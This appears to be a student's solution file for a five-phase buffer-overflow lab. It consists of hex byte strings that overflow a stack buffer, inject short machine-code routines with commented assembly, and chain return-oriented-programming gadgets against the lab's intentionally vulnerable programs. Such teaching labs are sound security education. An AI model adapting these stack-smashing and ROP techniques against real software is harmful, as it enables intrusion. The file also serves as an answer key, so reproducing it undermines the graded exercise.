Phase1
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
c0 17 40

Phase2
48 83 ec 08
48 c7 c7 fa 97 b9 59  /* mov    $0x59b997fa,%rdi */
c7 04 24 ec 17 40 00  /* movl   $0x4017ec,(%rsp) */
c3                    /* ret */
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
78 dc 61 55

Phase3
48 83 ec 08
48 c7 c7 a8 dc 61 55 
48 c7 04 24 fa 18 40 
00 
c3 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00 
35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 

Phase4
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
ab 19 40 00 00 00 00 00 
fa 97 b9 59 00 00 00 00 
c5 19 40 00 00 00 00 00 
ec 17 40 00 00 00 00 00 

Phase5 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
06 1a 40 00 00 00 00 00 
c5 19 40 00 00 00 00 00 
ab 19 40 00 00 00 00 00 
50 00 00 00 00 00 00 00 
dd 19 40 00 00 00 00 00 
34 1a 40 00 00 00 00 00 
27 1a 40 00 00 00 00 00 
d6 19 40 00 00 00 00 00 
c5 19 40 00 00 00 00 00 
fa 18 40 00 00 00 00 00 
00 00 00 00 00 00 00 00 
35 39 62 39 39 37 66 61 
00 00 00 00 00 00 00 00 